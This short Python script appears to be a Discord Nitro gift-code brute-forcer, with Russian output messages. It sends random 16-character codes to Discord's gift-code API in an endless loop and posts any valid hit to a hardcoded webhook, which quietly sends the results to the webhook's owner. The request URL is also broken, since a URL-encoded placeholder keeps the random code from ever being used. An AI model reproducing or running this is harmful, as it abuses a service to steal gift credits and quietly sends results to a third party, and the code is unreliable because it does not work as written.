import os
import re
import json
import random
import requests
import string

from dhooks import Webhook
from urllib.request import Request, urlopen


print('Все рабочие коды:')
while True:
    nitro = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    url = f"https://discordapp.com/api/v9/entitlements/gift-codes/%7Bnitro%7D?with_application=false&with_subscription_plan=true"
    response = requests.get(url)
    if response.status_code == 200:
        print(f'discord.gift{nitro} рабочий')
        hook = Webhook('https://discord.com/api/webhooks/1006283520030818334/TAvL_ET0nJl9jofrmk4ADn0m-Nmd2uUTBm9jWz-YEbOLvhruv7y2z6nCz6tgFlUvo3ff')
        hook.send(f"|| https://discord.gift/{nitro} ||" ) 
